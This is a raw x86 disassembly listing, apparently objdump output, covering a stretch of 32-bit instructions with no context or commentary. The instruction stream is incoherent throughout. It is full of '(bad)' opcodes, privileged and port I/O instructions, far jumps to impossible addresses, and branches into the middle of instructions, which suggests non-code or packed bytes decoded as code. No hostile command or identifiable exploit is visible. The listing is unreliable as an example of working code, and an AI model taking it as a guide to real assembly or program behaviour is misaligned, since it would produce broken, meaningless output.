  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
